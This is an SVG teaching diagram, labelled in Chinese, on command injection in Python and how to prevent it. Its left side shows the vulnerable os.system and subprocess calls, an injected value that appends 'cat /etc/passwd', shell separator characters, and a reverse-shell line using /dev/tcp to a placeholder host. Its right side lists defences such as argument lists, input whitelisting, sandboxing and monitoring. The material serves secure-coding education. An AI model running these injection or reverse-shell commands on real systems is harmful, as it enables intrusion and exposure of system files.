<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 480" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="480" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">命令注入原理与防御</text>

  <rect x="40" y="60" width="200" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="140" y="92" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">用户输入</text>

  <rect x="280" y="60" width="200" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="380" y="92" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">命令拼接</text>

  <rect x="520" y="60" width="200" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="620" y="92" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">系统执行</text>

  <rect x="760" y="60" width="200" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="860" y="92" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">结果输出</text>

  <rect x="40" y="140" width="460" height="310" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">命令注入原理</text>

  <text x="70" y="195" font-size="10" font-weight="bold" fill="#c53030">危险代码：</text>
  <text x="70" y="215" font-size="9" fill="#2d3748">os.system("ping " + user_input)</text>
  <text x="70" y="235" font-size="9" fill="#2d3748">subprocess.run(f"ping {ip}", shell=True)</text>

  <text x="70" y="265" font-size="10" font-weight="bold" fill="#805ad5">注入原理：</text>
  <text x="70" y="285" font-size="9" fill="#2d3748">ip=8.8.8.8;cat /etc/passwd</text>
  <text x="70" y="305" font-size="9" fill="#2d3748">→ ping 8.8.8.8;cat /etc/passwd</text>

  <text x="70" y="335" font-size="10" font-weight="bold" fill="#dd6b20">连接符：</text>
  <text x="70" y="355" font-size="9" fill="#2d3748">;  ::  &&  ||  `  $( )</text>
  <text x="70" y="375" font-size="9" fill="#2d3748">`  $()  ;  &amp;&amp;  ||  |</text>
  <text x="70" y="395" font-size="9" fill="#2d3748">\\n  %0a  %0d%0a</text>

  <text x="70" y="425" font-size="10" font-weight="bold" fill="#3182ce">利用方式：</text>
  <text x="70" y="445" font-size="9" fill="#2d3748">反弹 Shell：bash -i &gt;&amp; /dev/tcp/xxx/4444</text>

  <rect x="520" y="140" width="440" height="310" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">防御方法</text>

  <text x="550" y="195" font-size="10" font-weight="bold" fill="#c53030">方案1：避免拼接</text>
  <text x="550" y="215" font-size="9" fill="#2d3748">subprocess.run(["ping", ip], shell=False)</text>
  <text x="550" y="235" font-size="9" fill="#2d3748">使用参数列表而非字符串拼接</text>

  <text x="550" y="265" font-size="10" font-weight="bold" fill="#805ad5">方案2：输入过滤</text>
  <text x="550" y="285" font-size="9" fill="#2d3748">只允许 IP 格式：1-255.1-255.1-255.1-255</text>
  <text x="550" y="305" font-size="9" fill="#2d3748">过滤特殊字符：; | &amp; ` $ ( )</text>

  <text x="550" y="335" font-size="10" font-weight="bold" fill="#dd6b20">方案3：沙箱隔离</text>
  <text x="550" y="355" font-size="9" fill="#2d3748">使用 subprocess 限制执行时间</text>
  <text x="550" y="375" font-size="9" fill="#2d3748">容器隔离 · 最小权限执行</text>

  <text x="550" y="405" font-size="10" font-weight="bold" fill="#3182ce">方案4：监控告警</text>
  <text x="550" y="425" font-size="9" fill="#2d3748">记录所有命令执行日志</text>
  <text x="550" y="445" font-size="9" fill="#2d3748">异常命令立即告警</text>
</svg>
